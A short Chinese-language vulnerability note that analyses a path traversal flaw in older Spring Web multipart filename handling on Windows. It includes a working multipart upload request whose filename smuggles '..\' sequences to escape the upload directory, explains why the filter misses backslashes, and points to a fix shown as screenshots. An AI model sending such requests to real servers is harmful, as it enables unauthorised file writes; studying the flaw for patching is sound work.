前置条件

- spring-web <= 4.1.8.RELEASE 对应 spingboot <= v1.2.7.RELEASE
- Windows


```
\org\springframework\spring-web\4.0.8.RELEASE\spring-web-4.1.8.RELEASE.jar!\org\springframework\web\multipart\commons\CommonsMultipartFile.class
```

```http
POST /upload HTTP/1.1
Host: localhost:9090
Content-Type: multipart/form-data; boundary=2022
Content-Length: 114

--2022
Content-Disposition: form-data; name="file"; filename="../..\\..\\..\\flag.txt"

hello world
--2022--
```

- org.springframework.web.multipart.commons.CommonsMultipartFile#getOriginalFilename

![](img/Pasted%20image%2020220818204052.png)

- `filename="../..\\..\\..\\flag.txt"` or `filename="../..\..\..\flag.txt"`
- pos = 2 且 != -1 ，所以不会对 `\` 进行处理
- 而Windows是支持 `..\` 和 `..\\`的
	- ![](img/Pasted%20image%2020220818204102.png)
- 从而可以进行路径穿越


修复：

![](img/Pasted%20image%2020220818204110.png)
